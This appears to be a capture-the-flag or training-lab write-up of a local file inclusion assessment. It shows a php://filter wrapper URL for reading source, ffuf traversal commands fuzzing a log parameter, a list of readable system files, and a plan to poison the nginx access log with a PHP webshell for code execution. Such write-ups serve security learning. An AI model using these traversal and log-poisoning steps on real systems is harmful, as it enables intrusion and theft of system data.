# Assessment

Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.

<figure><img src="../../.gitbook/assets/image (82) (1).png" alt=""><figcaption><p>page parameter</p></figcaption></figure>

* Can't include /etc/passwd
* Can't ffuf for valid files
* had to use PHP wrapper to view source code

```
view-source:http://46.101.95.166:30586/index.php?page=php://filter/read=convert.base64-encode/resource=index
```

<figure><img src="../../.gitbook/assets/image (46) (1).png" alt=""><figcaption><p>ilf_admin/index.php</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (80) (1).png" alt=""><figcaption><p>log parameter seems to be including files</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (19) (1).png" alt=""><figcaption><p>included file</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (100) (1).png" alt=""><figcaption><p>No session values found so is not php session poisoning</p></figcaption></figure>

```
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://46.101.95.166:30586/ilf_admin/index.php?log=FUZZ' -c 
```

```
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt:FUZZ -u 'http://46.101.95.166:30647/ilf_admin/index.php?log=../../../../../../../../../../FUZZ' -c -fs 2046

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://46.101.95.166:30647/ilf_admin/index.php?log=../../../../../../../../../../FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 2046
________________________________________________

    * FUZZ: /etc/passwd
    * FUZZ: /etc/inittab
    * FUZZ: /etc/hosts
    * FUZZ: /etc/fstab
    * FUZZ: /etc/issue
    * FUZZ: /etc/mtab]
    * FUZZ: /etc/motd
    * FUZZ: /etc/resolv.conf
    * FUZZ: /etc/profile
    * FUZZ: /proc/cpuinfo
    * FUZZ: /proc/ioports
    * FUZZ: /proc/filesystems
    * FUZZ: /proc/interrupts
    * FUZZ: /proc/meminfo
    * FUZZ: /proc/stat
    * FUZZ: /proc/mounts
    * FUZZ: /proc/swaps
    * FUZZ: /proc/self/net/arp
    * FUZZ: /proc/version
    * FUZZ: /proc/modules
    * FUZZ: /etc/ca-certificates.conf
    * FUZZ: /etc/group-
    * FUZZ: /etc/group
    * FUZZ: /etc/hostname
    * FUZZ: /etc/modules
    * FUZZ: /etc/passwd-
    * FUZZ: /etc/nginx/nginx.conf
    * FUZZ: /etc/os-release
    * FUZZ: /etc/sysctl.conf
    * FUZZ: /proc/devices
    * FUZZ: /proc/net/udp
    * FUZZ: /proc/self/cmdline
    * FUZZ: /proc/self/environ
    * FUZZ: /proc/self/mounts
    * FUZZ: /proc/self/stat
    * FUZZ: /proc/self/status
    * FUZZ: /proc/net/tcp
    * FUZZ: /var/log/nginx/access.log
    * FUZZ: /var/log/nginx/error.log
```

Above are list of files that were accessible

to perform server log poisoning we need access to access.log file&#x20;

<figure><img src="../../.gitbook/assets/image (88) (1).png" alt=""><figcaption><p>../../../../../var/log/nginx/access.log</p></figcaption></figure>

now we can try to edit the header to php webshell.

<figure><img src="../../.gitbook/assets/image (79) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

